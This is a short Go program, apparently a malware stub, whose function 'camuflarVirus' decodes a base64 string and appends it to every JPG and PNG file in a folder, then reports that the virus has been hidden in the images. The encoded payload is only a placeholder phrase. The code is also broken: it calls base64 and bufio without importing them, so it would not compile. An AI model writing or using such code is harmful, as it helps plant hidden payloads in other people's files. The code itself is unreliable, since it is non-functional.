package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

func camuflarVirus() {
	virusBase64 := "cGFzc3dvcmQgdmlydXMgZW5jb2RlIGJpbmFyeSBkYXRh"
	virusDecoded, _ := base64.StdEncoding.DecodeString(virusBase64)

	imagens, _ := ioutil.ReadDir("./imagens")
	for _, img := range imagens {
		if strings.HasSuffix(img.Name(), ".jpg") || strings.HasSuffix(img.Name(), ".png") {
			file, _ := os.OpenFile("./imagens/"+img.Name(), os.O_APPEND|os.O_WRONLY, 0644)
			writer := bufio.NewWriter(file)
			writer.WriteString(string(virusDecoded))
			writer.Flush()
			file.Close()
		}
	}

	fmt.Println("Vírus camuflado com sucesso nas imagens!")
}

func main() {
	camuflarVirus()
}
